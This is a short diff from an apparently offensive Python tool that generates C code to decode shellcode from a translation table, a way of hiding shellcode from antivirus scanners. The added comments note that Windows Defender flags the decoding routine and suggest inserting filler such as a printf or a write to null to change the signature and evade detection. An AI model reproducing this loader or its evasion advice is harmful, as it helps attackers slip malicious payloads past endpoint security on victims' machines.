@@ -111,13 +111,15 @@ def main():
           for (int sc_index = 0; sc_index < # of shelcode bytes; sc_index++)
         */
         for (int sc_index = 0; sc_index < XXX; sc_index++) {
-                for (int tt_index = 0; tt_index <= 255; tt_index++) {
-                        //if (translation_table[tt_index] == translated_shellcode[sc_index]) {
-                        if (strcmp(translation_table[tt_index], translated_shellcode[sc_index]) == 0) {
-                                shellcode[sc_index] = tt_index;
-                                break;
-                        }
-                }
+            // Defender is identifying this translation routine as of 3/28/24
+            // Consider adding a printf, writing to null, or some other routine to change up the signature.
+            for (int tt_index = 0; tt_index <= 255; tt_index++) {
+                    //if (translation_table[tt_index] == translated_shellcode[sc_index]) {
+                    if (strcmp(translation_table[tt_index], translated_shellcode[sc_index]) == 0) {
+                            shellcode[sc_index] = tt_index;
+                            break;
+                    }
+            }
         }
 '''
     generated_forloop = generated_forloop.replace('XXX', str(sc_len))
